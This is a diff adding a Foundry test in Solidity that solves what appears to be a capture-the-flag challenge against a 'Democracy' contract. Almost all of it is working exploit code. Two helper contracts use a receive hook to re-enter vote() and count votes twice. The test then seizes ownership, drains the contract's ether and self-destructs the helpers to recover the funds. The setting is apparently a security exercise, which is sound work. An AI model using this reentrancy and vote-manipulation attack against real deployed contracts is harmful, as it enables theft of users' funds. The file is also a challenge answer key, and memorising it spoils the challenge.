@@ -1,0 +1,82 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+import {Test, console2} from "forge-std/Test.sol";
+
+import {Democracy} from "../src/Democracy.sol";
+
+contract DemocracyTest is Test {
+    Democracy d;
+    address user = makeAddr("USER");
+
+    function setUp() public {
+        d = new Democracy{value:1 ether}();
+    }
+
+    function test_run() public {
+
+        vm.startPrank(user, user);
+        Exploit e = new Exploit(d);
+        d.nominateChallenger(address(user));
+        d.transferFrom(user, address(e), 0);
+        d.vote(user);
+        d.transferFrom(user, address(e.e2()), 1);
+        e.attack();
+        d.withdrawToAddress(user);
+
+        assertEq(d.owner(), address(user), "not owner");
+        assertEq(address(d).balance, 0, "not drain");
+
+        // recover funds from exploit contract
+        e.e2().bye();
+        e.bye();
+
+        assertEq(address(user).balance, 1 ether, "not drain");
+
+    }    
+}
+
+contract Exploit {
+    Democracy d;
+    address immutable owner;
+    Exploit2 public e2;
+    constructor(Democracy d_) payable {
+        d = d_;
+        owner = msg.sender;
+        e2 = new Exploit2(d, msg.sender);
+    }
+
+    function bye() public {
+        require(msg.sender == owner, "not owner");
+        selfdestruct(payable(owner));
+    }
+
+    function attack() public {
+        d.vote(owner);
+    }
+
+    receive() external payable {
+        e2.attack();
+    }
+}
+
+contract Exploit2 {
+    address owner;
+    Democracy d;
+    constructor(Democracy d_, address _owner) payable {
+        d = d_;
+        owner = _owner;
+    }
+
+    function bye() public {
+        require(msg.sender == owner, "not owner");
+        selfdestruct(payable(owner));
+    }
+
+    function attack() public {
+        d.vote(owner);
+    }
+    fallback() external payable {
+        
+    }
+}
